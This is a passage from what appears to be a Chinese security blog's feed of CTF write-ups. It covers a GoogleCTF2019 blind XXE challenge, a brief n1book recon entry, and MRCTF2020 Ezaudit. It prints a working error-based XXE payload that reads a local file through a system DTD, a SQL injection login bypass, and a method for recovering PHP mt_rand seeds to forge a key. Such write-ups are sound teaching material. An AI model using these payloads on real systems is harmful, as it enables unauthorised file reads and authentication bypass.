class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  <span class="keyword">var</span> message_new = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blindvalues.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    blindmap[i + <span class="number">97</span>] = blindvalues[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; message.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    message_new += blindmap[(message[i].<span class="title function_">charCodeAt</span>(<span class="number">0</span>))];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  datasend = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: message_new,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">&#x27;/api/search&#x27;</span>;</span><br><span class="line">  xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">  xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  xhr.<span class="property">onreadystatechange</span> =</span><br><span class="line">      <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="title function_">getResponseHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>));</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="title function_">getResponseHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>) == <span class="string">&quot;application/json; charset=utf-8&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> json = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;database-data&#x27;</span>).<span class="property">value</span> = json[<span class="string">&#x27;ValueSearch&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(e) &#123;;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;database-data&#x27;</span>).<span class="property">value</span> = e.<span class="property">message</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;database-data&#x27;</span>).<span class="property">value</span> = xhr.<span class="property">responseText</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      xhr.<span class="title function_">send</span>(datasend);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到了用<code>json</code>传送数据，这样就有可能出现xxe漏洞。</p><h2 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h2><p>这里因为传送的字段名为<code>message，</code>所以将<code>a</code>改为<code>message</code>就能注入了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        %local_dt</span></span><br><span class="line"><span class="meta">        d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><strong>capture the flag</strong><br><img src="/2020/11/10/GoogleCTF2019-Quals-Bnv//1.png" alt="获得flag"><br>flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;47c6d876-4d9f-41dc-a3f8-b6ad1ac1315e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> blindxxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj之n1book复盘</title>
      <link href="/2020/11/09/n1book%E5%A4%8D%E7%9B%98/"/>
      <url>/2020/11/09/n1book%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h2 id="1-第一章-web入门-常见的搜集"><a href="#1-第一章-web入门-常见的搜集" class="headerlink" title="1.[第一章 web入门]常见的搜集"></a>1.[第一章 web入门]常见的搜集</h2><p>先访问robots.txt，再根据提示得flag1为<code>n1book&#123;info_1</code>，<code>.index.php.swp</code>得flag3为:<code>p0rtant_hack&#125;</code>;<br>&#96;</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> n1book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezaudit</title>
      <link href="/2020/11/09/MRCTF2020-Ezaudit/"/>
      <url>/2020/11/09/MRCTF2020-Ezaudit/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font size="22" color="blue">I am waiting for you.<p></p></font></p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe><h2 id="1-源码泄露"><a href="#1-源码泄露" class="headerlink" title="1.源码泄露"></a>1.源码泄露</h2><p>首先进入主页未发现明显的异常，就是个普通的界面，这种一般就是源码泄露了，访问<code>www.zip</code>得源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = <span class="title function_ invoke__">public_key</span>();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><h2 id="2-密码"><a href="#2-密码" class="headerlink" title="2.密码"></a>2.密码</h2><p>密码为从数据库查询得到的，这里可以用万能密码<code>1&#39; or &#39;1&#39; = &#39;1</code>来绕过。</p><h2 id="3-私钥"><a href="#3-私钥" class="headerlink" title="3.私钥"></a>3.私钥</h2><p>这里的私钥的生成方法如下<del>已经给的很详细了</del>，阿巴阿巴</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = <span class="title function_ invoke__">public_key</span>();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>因为公钥私钥都是使用一个种子值来推算的，所以我们只要通过公钥逆向推出种子值，再通过种子值来推算出公钥私钥，就可以再正向推出我们的私钥了。(这就是mt_rand伪随机数的爆破原理)<br>这里用到脚本<code>php_mt_seed</code>，百度下载在kali里面make一下再使用。<br><a href="https://github.com/lepiaf/php_mt_seed">php_mt_seed工具地址</a><br>make后<br><img src="/2020/11/09/MRCTF2020-Ezaudit//1.png"></p><h2 id="4-php-mt-seed-之-crack"><a href="#4-php-mt-seed-之-crack" class="headerlink" title="4.php_mt_seed 之 crack"></a>4.php_mt_seed 之 crack</h2><p>这里要想用这个工具的话，得先把他给出的公钥换成可以破解的形式，转换的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == s[j]:</span><br><span class="line">            m += <span class="string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="built_in">format</span>(j,j,<span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2020/11/09/MRCTF2020-Ezaudit//2.png"><br>得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p><strong>然后在kali里面执行一下命令破解</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>效果如下图所示<br><img src="/2020/11/09/MRCTF2020-Ezaudit//3.png"></p><p>所以<code>mt_srand</code>的值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1775196155</span><br></pre></td></tr></table></figure><p>然后用下面的php代码找到<code>private_key</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">public_key</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">private_key</span>());</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>效果如下<br><img src="/2020/11/09/MRCTF2020-Ezaudit//4.png"></p><p>所以私钥的值如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XuNhoueCDCGc</span><br></pre></td></tr></table></figure><h2 id="5-得flag"><a href="#5-得flag" class="headerlink" title="5.得flag"></a>5.得flag</h2><p>再回到前面的判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">XuNhoueCDCGc</span><br></pre></td></tr></table></figure><p><img src="/2020/11/09/MRCTF2020-Ezaudit//5.png"><br>在<code>login.html</code>页面上传数据获得flag</p><p><strong>capture the flag</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b9149181-4ac6-4487-ae22-fdd6428f2f63&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> php伪随机数 </tag>
            
